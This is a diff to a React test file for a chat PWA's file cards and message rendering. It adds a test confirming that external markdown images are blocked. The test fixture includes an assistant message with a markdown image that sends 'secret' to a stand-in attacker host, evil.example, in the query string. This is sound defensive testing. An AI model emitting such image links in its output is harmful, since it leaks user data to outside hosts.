@@ -30,7 +30,7 @@ describe('FileCards', () => {
     fireEvent.click(card);
     const lightbox = screen.getByTestId('lightbox');
     expect(lightbox).toBeInTheDocument();
-    expect(screen.getByRole('link', { name: /Open image in a new tab/ })).toHaveAttribute('href', url);
+    expect(screen.getByRole('button', { name: /Save or share image/ })).toBeInTheDocument();
     fireEvent.click(screen.getByRole('button', { name: 'Close image' }));
     expect(screen.queryByTestId('lightbox')).toBeNull();
   });
@@ -40,7 +40,7 @@ describe('FileCards', () => {
     render(<FileCards refs={[{ path: '/Users/sean/Desktop/labs.pdf', name: 'labs.pdf', ext: 'pdf', kind: 'file' }]} rest={rest} />);
     expect(screen.getByText('labs.pdf')).toBeInTheDocument();
     await waitFor(() => expect(screen.getByText('PDF, 2 KB')).toBeInTheDocument());
-    expect(screen.getByTestId('file-row')).toHaveAttribute('href', '/api/plugins/hermes-pwa/file?path=%2FUsers%2Fsean%2FDesktop%2Flabs.pdf');
+    expect(screen.getByTestId('file-row')).toHaveAttribute('data-href', '/api/plugins/hermes-pwa/file?path=%2FUsers%2Fsean%2FDesktop%2Flabs.pdf');
   });
 
   it('marks files the Mac cannot serve and removes the link', async () => {
@@ -132,5 +132,27 @@ describe('MessageBubble file handling', () => {
     );
     expect(screen.getByRole('table')).toBeInTheDocument();
     expect(screen.getByText('old').tagName).toBe('DEL');
+  });
+});
+
+describe('markdown image policy', () => {
+  it('renders same-origin images and blocks external ones', async () => {
+    const { render, screen } = await import('@testing-library/react');
+    const { MessageBubble } = await import('./MessageBubble');
+    const rpc = { request: () => Promise.resolve(), events: new EventTarget() } as unknown as import('@hermes-pwa/core').RpcClient;
+    render(
+      <MessageBubble
+        rpc={rpc}
+        message={{
+          id: 'img',
+          role: 'assistant',
+          text: '![local](/api/plugins/hermes-pwa/file?path=%2Ftmp%2Fa.png)\n\n![leak](https://evil.example/x.png?d=secret)',
+          createdAt: undefined,
+        }}
+      />,
+    );
+    const imgs = screen.getAllByRole('img');
+    expect(imgs.map((i) => i.getAttribute('src'))).toEqual(['/api/plugins/hermes-pwa/file?path=%2Ftmp%2Fa.png']);
+    expect(screen.getByText('leak')).toHaveClass('hm-message__blocked-image');
   });
 });
